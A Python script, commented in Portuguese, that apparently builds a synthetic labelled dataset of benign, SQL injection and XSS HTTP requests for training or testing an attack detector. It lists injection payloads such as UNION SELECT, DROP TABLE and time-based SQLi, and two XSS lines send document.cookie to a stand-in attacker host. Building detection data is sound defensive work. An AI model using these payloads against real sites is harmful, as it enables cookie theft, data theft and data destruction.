#!/usr/bin/env python
# Gera um dataset ARTIFICIAL complementar (nao baseado no CSIC), no mesmo
# formato do DATASET_METODO_BALANCEADO.tsv (timestamp, method, url, body,
# malicioso, xss, sqli), simulando trafego HTTP de varios TIPOS de site
# diferentes (e-commerce, blog, rede social, banco, API REST, busca, forum,
# upload de arquivo, autenticacao, painel admin, noticias, reserva/viagem,
# saude, educacao, analytics) combinados com varias tecnicas de SQLi e XSS
# em varios contextos, para dar diversidade real (nao um unico "sabor" de
# ataque/trafego como o CSIC). Objetivo: servir como terceira fonte de
# dados para testar/reforcar generalizacao cross-dataset.
#
# 5000 benignas, 2500 SQLi, 2500 XSS (10000 linhas no total).

import random
import string
import urllib.parse
from datetime import datetime, timedelta

SEED = 42
random.seed(SEED)

N_BENIGNAS = 5000
N_SQLI = 2500
N_XSS = 2500

SAIDA = "dataset_artificial_ia.tsv"

# ---------------------------------------------------------------------------
# vocabularios gerais (usados em varios perfis de site)
# ---------------------------------------------------------------------------

DOMINIOS = [
    "lojaboa.com.br", "megastore.io", "blogpessoal.net", "diarioonline.com",
    "conectasocial.app", "bancovirtual.com.br", "apiclientes.dev",
    "buscafacil.com", "forumtech.org", "arquivosnuvem.io", "portaldenoticias.com.br",
    "viajemais.com", "saudeonline.med.br", "aprendaja.edu.br", "trackevent.io",
    "pagamentoseguro.com.br", "streamplus.tv", "imoveisagora.com.br",
    "receitasfaceis.com", "carrosusados.com.br",
]

NOMES = ["Ana","Bruno","Carla","Diego","Elena","Felipe","Gabriela","Hugo",
         "Isabela","Joao","Karina","Lucas","Mariana","Nicolas","Olivia",
         "Pedro","Queila","Rafael","Sofia","Thiago","Valentina","Wesley",
         "Yasmin","Zeca","Camila","Eduardo","Fernanda","Gustavo","Helena","Igor"]
SOBRENOMES = ["Silva","Souza","Costa","Pereira","Oliveira","Santos","Rodrigues",
              "Almeida","Nascimento","Lima","Araujo","Ribeiro","Carvalho",
              "Gomes","Martins","Rocha","Barbosa","Teixeira","Cardoso","Reis"]
CIDADES = ["Sao Paulo","Rio de Janeiro","Belo Horizonte","Curitiba","Porto Alegre",
           "Salvador","Recife","Fortaleza","Brasilia","Campinas","Florianopolis"]
PRODUTOS = ["Notebook","Smartphone","Fone Bluetooth","Cadeira Gamer","Monitor 4K",
            "Teclado Mecanico","Mouse sem Fio","Camera DSLR","Tablet","Smartwatch",
            "Livro","Panela Eletrica","Tenis Esportivo","Mochila","Cafeteira"]
TERMOS_BUSCA = ["promocao", "frete gratis", "melhor preco", "lancamento", "usado",
                "original", "kit", "premium", "compacto", "sem juros"]
ARQUIVOS = ["relatorio.pdf", "planilha.xlsx", "foto_perfil.jpg", "contrato.docx",
            "apresentacao.pptx", "backup.zip", "nota_fiscal.pdf", "curriculo.pdf"]

def rand_nome_completo():
    return f"{random.choice(NOMES)} {random.choice(SOBRENOMES)}"

def rand_email():
    n = random.choice(NOMES).lower()
    s = random.choice(SOBRENOMES).lower()
    dom = random.choice(["gmail.com","hotmail.com","yahoo.com.br","outlook.com","uol.com.br"])
    return f"{n}.{s}{random.randint(1,999)}@{dom}"

def rand_senha():
    # senha "de gente real": as vezes so letras, as vezes mix aleatorio de
    # digitos/letras/simbolos - de proposito parecido com o padrao que
    # causou falso positivo na analise anterior (alta entropia mas legitimo)
    tam = random.randint(6, 14)
    alfabeto = string.ascii_letters + string.digits + "!@#*"
    return "".join(random.choice(alfabeto) for _ in range(tam))

def rand_token():
    return "".join(random.choice(string.hexdigits.lower()) for _ in range(32))

def rand_uuid():
    partes = [8, 4, 4, 4, 12]
    return "-".join("".join(random.choice(string.hexdigits.lower()) for _ in range(p)) for p in partes)

def rand_preco():
    return f"{random.randint(9, 4999)}.{random.randint(0,99):02d}"

def rand_data():
    base = datetime(2025, 1, 1) + timedelta(days=random.randint(0, 700))
    return base.strftime("%Y-%m-%d")

def rand_timestamp():
    base = datetime(2026, 1, 1) + timedelta(
        days=random.randint(0, 240), seconds=random.randint(0, 86399))
    return base.strftime("%d/%b/%Y:%H:%M:%S -0300")

def enc(v):
    return urllib.parse.quote_plus(str(v))

def rand_endereco():
    ruas = ["Rua das Flores", "Av. Paulista", "Rua Sao Joao", "Rua XV de Novembro",
            "Av. Brasil", "Rua Coracao", "Alameda Santos"]
    return f"{random.choice(ruas)}, {random.randint(1,2000)}"


# ---------------------------------------------------------------------------
# perfis de site: cada um gera (method, path, query_params, body_params, tipo_body)
# tipo_body: None (sem corpo), "form" (x-www-form-urlencoded), "json"
# ---------------------------------------------------------------------------

def perfil_ecommerce_busca(dom):
    termo = random.choice(PRODUTOS) + " " + random.choice(TERMOS_BUSCA)
    qs = {"q": termo, "pagina": random.randint(1, 20), "ordenar": random.choice(["preco","relevancia","avaliacao"])}
    return "GET", "/busca", qs, None, None

def perfil_ecommerce_produto(dom):
    return "GET", f"/produto/{random.randint(1000,9999)}", {"cor": random.choice(["preto","branco","azul"])}, None, None

def perfil_ecommerce_carrinho(dom):
    body = {"produto_id": random.randint(1000,9999), "quantidade": random.randint(1,5),
            "cupom": random.choice(["", "PROMO10", "FRETEGRATIS"])}
    return "POST", "/carrinho/adicionar", {}, body, "form"

def perfil_ecommerce_checkout(dom):
    body = {"nome": rand_nome_completo(), "email": rand_email(), "endereco": rand_endereco(),
            "cidade": random.choice(CIDADES), "cep": f"{random.randint(10000,99999)}-{random.randint(100,999)}",
            "cartao_final": f"**** **** **** {random.randint(1000,9999)}"}
    return "POST", "/checkout/finalizar", {}, body, "json"

def perfil_blog_post(dom):
    return "GET", f"/blog/post/{random.randint(1,500)}-{random.choice(['dicas','tutorial','noticia','review'])}", {}, None, None

def perfil_blog_comentario(dom):
    corpo_comentario = random.choice([
        "Muito bom o artigo, me ajudou bastante!",
        "Nao concordo com esse ponto, acho que falta contexto.",
        "Otima explicacao, obrigado por compartilhar.",
        "Podia detalhar mais a parte tecnica?",
        "Excelente conteudo, vou aplicar no meu projeto.",
    ])
    body = {"autor": rand_nome_completo(), "email": rand_email(), "comentario": corpo_comentario}
    return "POST", f"/blog/post/{random.randint(1,500)}/comentar", {}, body, "form"

def perfil_social_perfil(dom):
    return "GET", f"/perfil/{random.choice(NOMES).lower()}{random.randint(1,999)}", {}, None, None

def perfil_social_postagem(dom):
    body = {"texto": random.choice([
        "Bom dia a todos!", "Alguem sabe uma boa receita de bolo?",
        "Acabei de terminar minha maratona, muito feliz!",
        "Procurando recomendacao de livro de ficcao cientifica.",
        "Feliz aniversario para minha melhor amiga!",
    ]), "visibilidade": random.choice(["publico","amigos","privado"])}
    return "POST", "/feed/postar", {}, body, "json"

def perfil_banco_saldo(dom):
    return "GET", "/conta/saldo", {"conta": f"{random.randint(10000,99999)}-{random.randint(0,9)}"}, None, None

def perfil_banco_transferencia(dom):
    body = {"conta_origem": f"{random.randint(10000,99999)}-{random.randint(0,9)}",
            "conta_destino": f"{random.randint(10000,99999)}-{random.randint(0,9)}",
            "valor": rand_preco(), "descricao": random.choice(["Aluguel","Emprestimo","Presente","Servico"])}
    return "POST", "/conta/transferir", {}, body, "json"

def perfil_api_rest(dom):
    recurso = random.choice(["usuarios","pedidos","produtos","clientes","faturas"])
    metodo = random.choice(["GET","POST","PUT","DELETE"])
    if metodo == "GET":
        return "GET", f"/api/v2/{recurso}", {"limit": random.randint(10,100), "offset": random.randint(0,500)}, None, None
    elif metodo == "DELETE":
        return "DELETE", f"/api/v2/{recurso}/{random.randint(1,9999)}", {}, None, None
    else:
        body = {"id": rand_uuid(), "nome": rand_nome_completo(), "ativo": random.choice([True, False])}
        return metodo, f"/api/v2/{recurso}", {}, body, "json"

def perfil_forum(dom):
    if random.random() < 0.5:
        return "GET", f"/forum/topico/{random.randint(1,3000)}", {"pagina": random.randint(1,10)}, None, None
    body = {"autor": rand_nome_completo(), "mensagem": random.choice([
        "Concordo plenamente com o que foi dito acima.",
        "Alguem ja tentou resolver esse erro de outra forma?",
        "Segue o log completo do problema que estou enfrentando.",
        "Consegui resolver, obrigado pela ajuda pessoal!",
    ])}
    return "POST", f"/forum/topico/{random.randint(1,3000)}/responder", {}, body, "form"

def perfil_upload(dom):
    arq = random.choice(ARQUIVOS)
    body = {"arquivo": arq, "pasta": random.choice(["documentos","fotos","backups","projetos"])}
    return "POST", "/arquivos/upload", {}, body, "form"

def perfil_auth_login(dom):
    body = {"usuario": rand_email(), "senha": rand_senha(), "lembrar": random.choice(["on","off"])}
    return "POST", "/auth/login", {}, body, "form"

def perfil_auth_cadastro(dom):
    body = {"nome": rand_nome_completo(), "email": rand_email(), "senha": rand_senha(),
            "telefone": f"({random.randint(11,99)}) 9{random.randint(1000,9999)}-{random.randint(1000,9999)}",
            "cidade": random.choice(CIDADES), "aceite_termos": "true"}
    return "POST", "/auth/cadastro", {}, body, "json"

def perfil_admin(dom):
    qs = {"filtro": random.choice(["hoje","semana","mes"]),
          "usuario_id": random.randint(1, 5000),
          "pagina": random.randint(1, 50)}
    return "GET", "/admin/dashboard", qs, None, None

def perfil_noticias(dom):
    return "GET", f"/noticias/{random.choice(['economia','esportes','tecnologia','saude','mundo'])}/{random.randint(1,9999)}", {}, None, None

def perfil_viagem_busca(dom):
    qs = {"origem": random.choice(CIDADES), "destino": random.choice(CIDADES),
          "data_ida": rand_data(), "passageiros": random.randint(1,5)}
    return "GET", "/viagens/buscar", qs, None, None

def perfil_saude_portal(dom):
    qs = {"periodo": random.choice(["proximas","historico"]),
          "paciente_id": random.randint(1, 20000),
          "especialidade": random.choice(["clinico","cardiologia","dermatologia","ortopedia","pediatria"])}
    return "GET", "/paciente/consultas", qs, None, None

def perfil_educacao(dom):
    body = {"curso_id": random.randint(1,300), "aluno": rand_nome_completo(),
            "resposta": random.choice(["A","B","C","D"])}
    return "POST", "/lms/atividade/enviar", {}, body, "form"

def perfil_analytics(dom):
    body = {"evento": random.choice(["click","pageview","scroll","purchase"]),
            "pagina": random.choice(["/home","/produto","/checkout","/blog"]),
            "utm_source": random.choice(["google","facebook","instagram","email","direto"])}
    return "POST", "/track/evento", {}, body, "json"

PERFIS = [
    perfil_ecommerce_busca, perfil_ecommerce_produto, perfil_ecommerce_carrinho,
    perfil_ecommerce_checkout, perfil_blog_post, perfil_blog_comentario,
    perfil_social_perfil, perfil_social_postagem, perfil_banco_saldo,
    perfil_banco_transferencia, perfil_api_rest, perfil_forum, perfil_upload,
    perfil_auth_login, perfil_auth_cadastro, perfil_admin, perfil_noticias,
    perfil_viagem_busca, perfil_saude_portal, perfil_educacao, perfil_analytics,
]


def montar_linha(method, path, qs, body_params, tipo_body, dom):
    url = f"http://{dom}{path}"
    if qs:
        url += "?" + "&".join(f"{k}={enc(v)}" for k, v in qs.items())

    if body_params is None:
        body = "-"
    elif tipo_body == "form":
        body = "&".join(f"{k}={enc(v)}" for k, v in body_params.items())
    elif tipo_body == "json":
        import json as _json
        body = _json.dumps(body_params, ensure_ascii=False)
    else:
        body = "-"
    return method, url, body


def gerar_benigna():
    perfil = random.choice(PERFIS)
    dom = random.choice(DOMINIOS)
    method, path, qs, body_params, tipo_body = perfil(dom)
    method, url, body = montar_linha(method, path, qs, body_params, tipo_body, dom)
    return rand_timestamp(), method, url, body, 0, 0, 0


# ---------------------------------------------------------------------------
# SQLi: varias tecnicas x varios contextos x varios dialetos
# ---------------------------------------------------------------------------

SQLI_TECNICAS = [
    lambda: "' OR '1'='1",
    lambda: "' OR 1=1-- -",
    lambda: "admin'--",
    lambda: "' OR ''='",
    lambda: f"' UNION SELECT username,password FROM usuarios-- -",
    lambda: f"' UNION SELECT NULL,NULL,NULL-- -",
    lambda: "' AND 1=1-- -",
    lambda: "' AND 1=2-- -",
    lambda: "'; DROP TABLE usuarios;-- -",
    lambda: "'; WAITFOR DELAY '0:0:5'--",
    lambda: "' AND SLEEP(5)-- -",
    lambda: "' OR pg_sleep(5)-- -",
    lambda: "' AND extractvalue(1,concat(0x7e,version()))-- -",
    lambda: "1 OR 1=1",
    lambda: "1; DROP TABLE pedidos--",
    lambda: "' OR '1'='1' /*",
    lambda: f"' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
    lambda: "'||(SELECT 1 FROM DUAL WHERE 1=1)||'",
    lambda: "' OR EXISTS(SELECT * FROM usuarios WHERE usuario='admin')-- -",
    lambda: "%27%20OR%20%271%27%3D%271",  # ja url-encoded
]

def sqli_contexto_login(dom, payload):
    body = {"usuario": payload, "senha": rand_senha()}
    return "POST", "/auth/login", {}, body, "form"

def sqli_contexto_busca(dom, payload):
    qs = {"q": payload, "pagina": 1}
    return "GET", "/busca", qs, None, None

def sqli_contexto_produto_id(dom, payload):
    return "GET", "/produto", {"id": payload}, None, None

def sqli_contexto_ordenar(dom, payload):
    return "GET", "/api/v2/produtos", {"orderby": payload, "limit": 20}, None, None

def sqli_contexto_api_json(dom, payload):
    body = {"filtro": payload, "campo": "nome"}
    return "POST", "/api/v2/consulta", {}, body, "json"

def sqli_contexto_path(dom, payload):
    return "GET", f"/relatorio/{urllib.parse.quote(payload, safe='')}", {}, None, None

def sqli_contexto_comentario(dom, payload):
    body = {"autor": rand_nome_completo(), "comentario": f"Otimo post! {payload}"}
    return "POST", "/blog/post/1/comentar", {}, body, "form"

def sqli_contexto_cupom(dom, payload):
    body = {"produto_id": random.randint(1,999), "cupom": payload}
    return "POST", "/carrinho/adicionar", {}, body, "form"

SQLI_CONTEXTOS = [sqli_contexto_login, sqli_contexto_busca, sqli_contexto_produto_id,
                  sqli_contexto_ordenar, sqli_contexto_api_json, sqli_contexto_path,
                  sqli_contexto_comentario, sqli_contexto_cupom]


def gerar_sqli():
    dom = random.choice(DOMINIOS)
    payload = random.choice(SQLI_TECNICAS)()
    if random.random() < 0.15:
        payload = enc(payload)  # variante url-encoded
    contexto = random.choice(SQLI_CONTEXTOS)
    method, path, qs, body_params, tipo_body = contexto(dom, payload)
    method, url, body = montar_linha(method, path, qs, body_params, tipo_body, dom)
    return rand_timestamp(), method, url, body, 1, 0, 1


# ---------------------------------------------------------------------------
# XSS: varias tecnicas x varios contextos, incluindo payload "enterrado"
# dentro de um campo longo e normal (padrao que o modelo mais errava)
# ---------------------------------------------------------------------------

XSS_TECNICAS = [
    lambda: "<script>alert(1)</script>",
    lambda: "<script>alert(document.cookie)</script>",
    lambda: "<img src=x onerror=alert(1)>",
    lambda: "<svg/onload=alert(1)>",
    lambda: "<body onload=alert('xss')>",
    lambda: "\"><script>alert(1)</script>",
    lambda: "' onmouseover='alert(1)",
    lambda: "javascript:alert(document.cookie)",
    lambda: "<iframe src=javascript:alert(1)></iframe>",
    lambda: "<ScRiPt>alert(1)</sCrIpT>",
    lambda: "<script>document.location='http://atacante.exemplo.com/roubo.cgi?'+document.cookie</script>",
    lambda: "<script>fetch('http://atacante.exemplo.com/c?d='+document.cookie)</script>",
    lambda: "<input autofocus onfocus=alert(1)>",
    lambda: "<a href=javascript:alert(1)>clique</a>",
    lambda: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # ja url-encoded
]

def xss_contexto_comentario(dom, payload):
    body = {"autor": rand_nome_completo(), "email": rand_email(), "comentario": payload}
    return "POST", "/blog/post/1/comentar", {}, body, "form"

def xss_contexto_busca(dom, payload):
    return "GET", "/busca", {"q": payload}, None, None

def xss_contexto_perfil_bio(dom, payload):
    body = {"bio": payload, "nome": rand_nome_completo()}
    return "POST", "/perfil/atualizar", {}, body, "json"

def xss_contexto_postagem(dom, payload):
    body = {"texto": payload, "visibilidade": "publico"}
    return "POST", "/feed/postar", {}, body, "json"

def xss_contexto_forum(dom, payload):
    body = {"autor": rand_nome_completo(), "mensagem": payload}
    return "POST", f"/forum/topico/{random.randint(1,3000)}/responder", {}, body, "form"

def xss_contexto_url_param(dom, payload):
    return "GET", "/perfil/editar", {"redirect": payload}, None, None

def xss_contexto_enterrado_cadastro(dom, payload):
    # payload colado no meio de um campo comprido e "normal" -
    # exatamente o padrao que mais gerava falso negativo na analise anterior
    cidade_com_payload = f"{random.choice(CIDADES)}{payload}"
    body = {"nome": rand_nome_completo(), "email": rand_email(), "senha": rand_senha(),
            "endereco": rand_endereco(), "cidade": cidade_com_payload,
            "cep": f"{random.randint(10000,99999)}-{random.randint(100,999)}",
            "telefone": f"({random.randint(11,99)}) 9{random.randint(1000,9999)}-{random.randint(1000,9999)}"}
    return "POST", "/auth/cadastro", {}, body, "form"

def xss_contexto_enterrado_checkout(dom, payload):
    endereco_com_payload = f"{rand_endereco()}{payload}"
    body = {"nome": rand_nome_completo(), "email": rand_email(),
            "endereco": endereco_com_payload, "cidade": random.choice(CIDADES),
            "cartao_final": f"**** **** **** {random.randint(1000,9999)}"}
    return "POST", "/checkout/finalizar", {}, body, "json"

XSS_CONTEXTOS = [xss_contexto_comentario, xss_contexto_busca, xss_contexto_perfil_bio,
                 xss_contexto_postagem, xss_contexto_forum, xss_contexto_url_param,
                 xss_contexto_enterrado_cadastro, xss_contexto_enterrado_checkout]


def gerar_xss():
    dom = random.choice(DOMINIOS)
    payload = random.choice(XSS_TECNICAS)()
    if random.random() < 0.15:
        payload = enc(payload)
    contexto = random.choice(XSS_CONTEXTOS)
    method, path, qs, body_params, tipo_body = contexto(dom, payload)
    method, url, body = montar_linha(method, path, qs, body_params, tipo_body, dom)
    return rand_timestamp(), method, url, body, 1, 1, 0


def gerar_unicas(func, n, vistos, max_tentativas_por_item=200):
    """Gera n linhas unicas (por url+body), descartando duplicatas e
    tentando de novo, para garantir diversidade real (nao repetir a mesma
    combinacao de url/body em templates de baixa cardinalidade)."""
    linhas = []
    while len(linhas) < n:
        for _ in range(max_tentativas_por_item):
            linha = func()
            chave = (linha[2], linha[3])   # (url, body)
            if chave not in vistos:
                vistos.add(chave)
                linhas.append(linha)
                break
        else:
            raise RuntimeError("nao consegui gerar linha unica - aumente a variedade dos templates")
    return linhas


def main():
    vistos = set()
    linhas = []
    linhas += gerar_unicas(gerar_benigna, N_BENIGNAS, vistos)
    linhas += gerar_unicas(gerar_sqli, N_SQLI, vistos)
    linhas += gerar_unicas(gerar_xss, N_XSS, vistos)

    random.shuffle(linhas)

    with open(SAIDA, "w", encoding="utf-8") as f:
        f.write("timestamp\tmethod\turl\tbody\tmalicioso\txss\tsqli\n")
        for ts, method, url, body, malicioso, xss, sqli in linhas:
            body_limpo = body.replace("\t", " ").replace("\n", " ")
            url_limpo = url.replace("\t", " ").replace("\n", " ")
            f.write(f"{ts}\t{method}\t{url_limpo}\t{body_limpo}\t{malicioso}\t{xss}\t{sqli}\n")

    print(f"[ok] {len(linhas)} linhas escritas em {SAIDA}")
    print(f"  benignas={N_BENIGNAS}  sqli={N_SQLI}  xss={N_XSS}")


if __name__ == "__main__":
    main()
